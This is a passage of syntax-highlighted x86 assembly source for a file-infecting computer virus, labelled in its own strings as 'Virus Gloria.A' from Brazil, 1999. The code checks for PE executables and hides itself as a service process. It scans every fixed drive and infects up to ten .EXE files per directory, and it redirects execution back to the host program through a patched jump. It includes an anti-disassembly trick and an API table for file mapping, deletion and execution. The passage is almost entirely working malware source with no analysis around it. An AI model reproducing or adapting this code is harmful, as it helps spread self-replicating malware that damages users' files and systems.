                </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">s@@2</span><span class="sc0">

        </span><span class="sc1">; Windows application</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">18h</span><span class="sc4">],</span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0"> </span><span class="sc5">s@@2</span><span class="sc0">
        
        </span><span class="sc1">; clean file</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3Ch</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">peofs</span><span class="sc4">],</span><span class="sc8">edi</span><span class="sc0">

</span><span class="sc1">;       ; avoid errors in files</span><span class="sc0">
</span><span class="sc1">;       ; like Wininit.exe</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       cmp edi,1000h</span><span class="sc0">
</span><span class="sc1">;       jae s@@2</span><span class="sc0">

        </span><span class="sc1">; check if is PE-exe</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc3">"EP"</span><span class="sc0">
                </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">s@@2</span><span class="sc0">

        </span><span class="sc1">; check if .petite section was found</span><span class="sc0">
        </span><span class="sc1">; if yes, quit from infection</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc3">"tep."</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">258h</span><span class="sc0">
        </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasd</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">s@@2</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">s@@2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">popad</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


        </span><span class="sc1">; Scan *.EXE files in directories and sub.</span><span class="sc0">
        </span><span class="sc1">; Look for all fixed disks  (A - Z)</span><span class="sc0">
        </span><span class="sc1">; Register as a service process</span><span class="sc0">

</span><span class="sc5">net_mode</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">RegisterServiceProcess</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; Wait one minute</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">one_minute</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sleep</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">drives</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; start with "A:\"</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc3">"A"</span><span class="sc0">

</span><span class="sc5">more_drives</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">drives</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">GetDriveTypeA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">inc_drives</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">drives</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; Find directories</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">check__drv</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">one_minute</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">Sleep</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">inc_drives</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">drives</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc1">; No more drives ?</span><span class="sc0">
        </span><span class="sc1">; Then start again</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">drives</span><span class="sc4">],</span><span class="sc2">05Bh</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0"> </span><span class="sc5">net_mode</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">more_drives</span><span class="sc0">



        </span><span class="sc1">; Look for directories and infect ten</span><span class="sc0">
        </span><span class="sc1">; files.</span><span class="sc0">

</span><span class="sc5">check__drv</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">_barra</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">SetCurrentDirectoryA</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">stringdir</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindFirstFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_dir1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_check_ret</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc1">; check directory attributes</span><span class="sc0">
        </span><span class="sc1">; can be 10h,11h,12h or 13h</span><span class="sc0">

</span><span class="sc5">check_dir_ok</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">file_data.FileAttributes</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc2">10h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">check_attr_dir</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">attr_dir_ok</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">check_attr_dir</span><span class="sc0">

        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">find_a</span><span class="sc0">
</span><span class="sc5">attr_dir_ok</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data.FileName</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc3">"."</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">find_a</span><span class="sc0">

        </span><span class="sc1">; copy directory to path</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">files_infect</span><span class="sc4">],</span><span class="sc8">al</span><span class="sc0">

        </span><span class="sc1">; here path name is the same as</span><span class="sc0">
        </span><span class="sc1">; directory name</span><span class="sc0">

        </span><span class="sc1">; and infect ten files</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">infect_one</span><span class="sc0">

        </span><span class="sc1">; At this point path name is</span><span class="sc0">
        </span><span class="sc1">; the directory plus file name</span><span class="sc0">
        </span><span class="sc1">; or the string *.EXE,0</span><span class="sc0">

        </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">path_name</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">260</span><span class="sc0">
        </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc1">; find next directory</span><span class="sc0">

</span><span class="sc5">find_a</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">file_data</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_dir1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindNextFileA</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">check_dir_ok</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">handle_dir1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FindClose</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">_check_ret</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Gloria_exit</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">or</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">_saida</span><span class="sc0">

</span><span class="sc5">exit_nt</span><span class="sc4">:</span><span class="sc0">        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">new_value_rva</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">new_imagebase</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">jump</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">jump</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">popad</span><span class="sc0">
                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0E9h</span><span class="sc0">
</span><span class="sc5">jump</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

</span><span class="sc5">old_value_rva</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">old_imagebase</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">new_value_rva</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">new_imagebase</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00h</span><span class="sc0">

        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">     </span><span class="sc1">; Confuse disassembler</span><span class="sc0">
</span><span class="sc5">unknow_os</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">reset_var</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">exit_nt</span><span class="sc0">

</span><span class="sc5">_saida</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">,</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">,</span><span class="sc2">1000h</span><span class="sc0">

        </span><span class="sc6">popad</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ExitProcess</span><span class="sc0">

</span><span class="sc5">my_section</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">".CODE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stringexe</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"\*.EXE"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">stringdir</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"*.*"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">drives</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"A:\",00h
</span><span class="sc0">
</span><span class="sc5">Net_sign</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">" Netbstat.exe"</span><span class="sc0">
</span><span class="sc5">System_ini</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"System.ini"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">Netbstat</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Netbstat.exe"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">_barra</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc13">"\",0
</span><span class="sc5">kernel32</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">12345678h</span><span class="sc0">

</span><span class="sc5">getprocaddress</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetProcAddress"</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">getprocaddresslen</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">ofs</span><span class="sc0"> </span><span class="sc5">getprocaddress</span><span class="sc0">

</span><span class="sc5">api_name</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">xFindFirstFileA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindFirstFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xFindNextFileA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindNextFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xDeleteFileA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"DeleteFileA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xGetFileSize</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileSize"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xSetFileAttributesA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xGetCurrentDirectoryA</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xCreateFileMappingA</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileMappingA"</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">xMapViewOfFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"MapViewOfFile"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xUnmapViewOfFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"UnmapViewOfFile"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xCreateFileA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CreateFileA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xWinExec</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"WinExec"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xCloseHandle</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CloseHandle"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xFindClose</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"FindClose"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xGetDriveTypeA</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetDriveTypeA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xCopyFileA</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"CopyFileA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xSleep</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"Sleep"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xSetCurrentDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetCurrentDirectoryA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xGetWindowsDirectoryA</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetWindowsDirectoryA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xGetFileAttributes</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetFileAttributesA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xGetCommandLineA</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"GetCommandLineA"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xRegisterServiceProcess</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"RegisterServiceProcess"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xSetFilePointer</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetFilePointer"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
</span><span class="sc5">xSetEndOfFile</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"SetEndOfFile"</span><span class="sc4">,</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">



        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"   Virus   Gloria.A    "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"  For my sweet Gloria  "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"     Brazil - 1999     "</span><span class="sc0">
        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc3">"     (c) N.B.K.    "</span><span class="sc0">




        </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">vir_size</span><span class="sc0">    </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc5">Gloria</span><span class="sc0">
</span><span class="sc5">entry_fim</span><span class="sc0">   </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

</span><span class="sc5">path_name</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">105h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">         </span><span class="sc1">; 261 bytes long</span><span class="sc0">
</span><span class="sc5">path_name@@</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">105h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; 261 bytes long</span><span class="sc0">
</span><span class="sc5">from_line</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">208h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">00h</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">; 520 bytes long</span><span class="sc0">
